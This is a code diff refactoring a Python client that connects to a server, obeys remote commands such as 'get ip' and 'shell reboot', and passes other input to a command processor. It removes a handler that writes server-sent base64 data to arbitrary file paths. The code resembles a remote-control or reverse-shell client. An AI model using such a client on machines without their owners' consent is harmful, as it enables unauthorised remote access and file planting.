@@ -11,6 +11,7 @@ from time import sleep
 class LoopController(object):
     def __init__(self):
         self.should_break = False
+        self.should_return = None
 
 
 class Client(object):
@@ -241,37 +242,6 @@ class Client(object):
         self._connect_to_server()
         return self
 
-    def write_file_data(self, upload_data, upload_filepath):
-        """
-        Write the upload_data to the upload_filename
-
-        :param upload_data:
-        :param upload_filepath:
-        :return:
-        """
-
-        with open(realpath(upload_filepath), 'wb') as f:
-            f.write(b64decode(upload_data))
-        print('<', upload_filepath, 'written...', '>')
-        return
-
-    def handle_file_upload(self, upload_data, upload_filename):
-        """
-        Handle the file upload.
-
-        :param upload_data:
-        :param upload_filename:
-        :return:
-        """
-
-        try:
-            self.write_file_data(upload_data, upload_filename)
-            self.send_data('Got file.')
-        except FileNotFoundError as err_msg:
-            self.send_data('Could not fine the directory to write to: {}'.format(err_msg))
-
-        return self
-
     def main(self):
         """
         Start receiving commands.
@@ -284,45 +254,15 @@ class Client(object):
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
-            upload_filepath = False
+            # upload_filepath = False
             while True:
                 data = self.receive_data()
 
-                if len(data) < 500:
-                    # Send ip back to server.
-                    if data[:6] == 'get ip':
-                        self.send_data(self.ip_address)
-                        continue
-
-                    # Disconnect from the server.
-                    if data == 'disconnect':
-                        self.handle_disconnect()
-                        continue
-
-                    # Break the loop.
-                    if data == 'break':
-                        self.send_data(' ')
-                        break
-
-                    # Reboot self.
-                    if data == 'shell reboot':
-                        self.send_data('confirmed')
-                        self.sock.close()
-                        break
-
-                    # # # # # # # PROCESS PLUGINS # # # # # # #
-                    plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
-                    if plugin_ran:
-                        if isinstance(loop_controller, LoopController):
-                            if loop_controller.should_break:
-                                break
-                        continue
-
-                    # Handle setting the file upload name.
-                    if data[:16] == 'upload_filepath ':
-                        upload_filepath = data[16:]
-                        self.send_data('Got filepath.')
-                        continue
+                # Handle setting the file upload name.
+                # if data[:16] == 'upload filepath ':
+                #     upload_filepath = data[16:]
+                #     self.send_data('Got filepath.')
+                #     continue
 
                 # # # # # # # PROCESS PLUGINS # # # # # # #
                 plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
@@ -332,14 +272,14 @@ class Client(object):
                             break
                     continue
 
-                if data[:11] == 'upload_data':
-                    if not upload_filepath:
-                        self.send_data('Requires an upload filename.  Send with `upload_filename {filename}`.')
-                        continue
-                    self.send_data('Send Data')
-                    upload_data = self.receive_data()
-                    self.handle_file_upload(upload_data, upload_filepath)
-                    continue
+                # if data[:11] == 'upload data':
+                #     if not upload_filepath:
+                #         self.send_data('Requires an upload filename.  Send with `upload-filename {filename}`.')
+                #         continue
+                #     self.send_data('Send Data')
+                #     upload_data = self.receive_data()
+                #     self.handle_file_upload(upload_data, upload_filepath)
+                #     continue
 
                 # Process the command.
                 try:
